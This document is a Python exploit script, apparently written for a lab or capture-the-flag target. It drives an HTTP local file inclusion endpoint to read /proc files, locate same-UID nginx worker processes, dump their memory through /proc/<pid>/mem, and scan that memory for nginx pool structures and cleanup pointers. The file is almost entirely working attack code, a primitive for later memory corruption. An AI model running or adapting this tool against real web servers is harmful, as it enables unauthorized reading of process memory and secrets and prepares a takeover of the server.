#!/usr/bin/env python3
import argparse
import dataclasses
import re
import struct
import urllib.error
import urllib.parse
import urllib.request


@dataclasses.dataclass
class Mapping:
    start: int
    end: int
    perms: str
    offset: int
    path: str


def read_url(url, timeout=5):
    with urllib.request.urlopen(url, timeout=timeout) as resp:
        return resp.read()


def lfi_read(base, path, offset=None, length=None, timeout=5):
    params = {"file": path}
    if offset is not None:
        params["offset"] = str(offset)
    if length is not None:
        params["length"] = str(length)
    return read_url(base + "?" + urllib.parse.urlencode(params), timeout=timeout)


def lfi_text(base, path, **kwargs):
    return lfi_read(base, path, **kwargs).decode("latin-1", errors="replace")


def parse_maps(text):
    mappings = []
    for line in text.splitlines():
        fields = line.split(None, 5)
        if len(fields) < 5 or "-" not in fields[0]:
            continue
        start, end = fields[0].split("-", 1)
        mappings.append(
            Mapping(
                int(start, 16),
                int(end, 16),
                fields[1],
                int(fields[2], 16),
                fields[5] if len(fields) == 6 else "",
            )
        )
    return mappings


def parse_uid(status):
    match = re.search(r"^Uid:\s+(\d+)\s+", status, re.MULTILINE)
    return int(match.group(1)) if match else None


def discover_worker(base, max_pid=256):
    self_uid = parse_uid(lfi_text(base, "/proc/self/status"))
    if self_uid is None:
        raise RuntimeError("could not learn LFI process UID")

    preferred = []
    for pid_file in ("/app/tmp/nginx.pid", "/run/nginx.pid", "/var/run/nginx.pid"):
        try:
            master = int(lfi_text(base, pid_file).strip().split()[0])
            children = lfi_text(base, f"/proc/{master}/task/{master}/children").split()
            preferred.extend(int(pid) for pid in children if pid.isdigit())
        except Exception:
            pass

    seen = set()
    for pid in preferred + list(range(1, max_pid + 1)):
        if pid in seen:
            continue
        seen.add(pid)
        try:
            status = lfi_text(base, f"/proc/{pid}/status", timeout=2)
        except Exception:
            continue
        if not (status.startswith("Name:\tnginx") or "Name: nginx" in status):
            continue
        if parse_uid(status) != self_uid:
            continue
        try:
            maps = lfi_text(base, f"/proc/{pid}/maps", timeout=2)
        except Exception:
            continue
        if "nginx" not in maps:
            continue
        return pid, parse_maps(maps)
    raise RuntimeError("no same-UID nginx worker with readable maps found")


def read_mem(base, pid, addr, length, timeout=10):
    return lfi_read(base, f"/proc/{pid}/mem", offset=addr, length=length, timeout=timeout)


def looks_like_pool(words, base, writable_ranges):
    if len(words) < 10:
        return False
    last, end, next_pool, _failed, max_size, current, _chain, _large, cleanup, log = words[:10]
    if not (base < last <= end):
        return False
    if not (0 < end - base <= 0x40000):
        return False
    if next_pool and not (base - 0x1000000 <= next_pool <= base + 0x1000000):
        return False
    if current and not (base <= current <= end):
        return False
    if cleanup and not (base - 0x1000000 <= cleanup <= base + 0x1000000):
        return False
    if not log or max_size > 0x100000:
        return False
    return any(start <= log < end for start, end in writable_ranges)


def scan_pools(base, pid, maps, max_region=8 * 1024 * 1024, chunk_size=256 * 1024):
    writable = [(m.start, m.end) for m in maps if m.perms.startswith("rw")]
    hits = []
    for m in maps:
        if not m.perms.startswith("rw"):
            continue
        size = m.end - m.start
        if size <= 0 or size > max_region:
            continue
        pos = 0
        carry = b""
        while pos < size:
            want = min(chunk_size, size - pos)
            try:
                chunk = read_mem(base, pid, m.start + pos, want)
            except (urllib.error.HTTPError, urllib.error.URLError, TimeoutError, OSError):
                break
            if not chunk:
                break
            buf = carry + chunk
            buf_addr = m.start + pos - len(carry)
            idx = ((buf_addr + 7) & ~0x7) - buf_addr
            while idx + 80 <= len(buf):
                pool_addr = buf_addr + idx
                words = struct.unpack_from("<10Q", buf, idx)
                if looks_like_pool(words, pool_addr, writable):
                    cleanup = words[8]
                    hits.append((pool_addr, words[0], words[1], cleanup, m.path))
                    if len(hits) >= 200:
                        return hits
                idx += 8
            carry = buf[-96:]
            pos += len(chunk)
    return hits


def main():
    parser = argparse.ArgumentParser(
        description="Scan same-UID nginx worker memory through an HTTP LFI /proc/<pid>/mem primitive."
    )
    parser.add_argument("--base", default="http://127.0.0.1:19321/lfi.php")
    parser.add_argument("--max-pid", type=int, default=512)
    args = parser.parse_args()

    pid, maps = discover_worker(args.base, args.max_pid)
    print(f"worker_pid={pid}")
    for m in maps:
        if m.perms.startswith("rw"):
            print(f"rw_map={m.start:#x}-{m.end:#x} {m.path}")

    first = next(m for m in maps if "nginx" in m.path)
    sample = read_mem(args.base, pid, first.start, 16)
    print(f"mem_sample@{first.start:#x}={sample.hex()}")

    pools = scan_pools(args.base, pid, maps)
    print(f"pool_hits={len(pools)}")
    for pool_addr, last, end, cleanup, path in pools[:30]:
        print(
            f"pool={pool_addr:#x} last={last:#x} end={end:#x} "
            f"cleanup={cleanup:#x} map={path or '[anon]'}"
        )


if __name__ == "__main__":
    main()
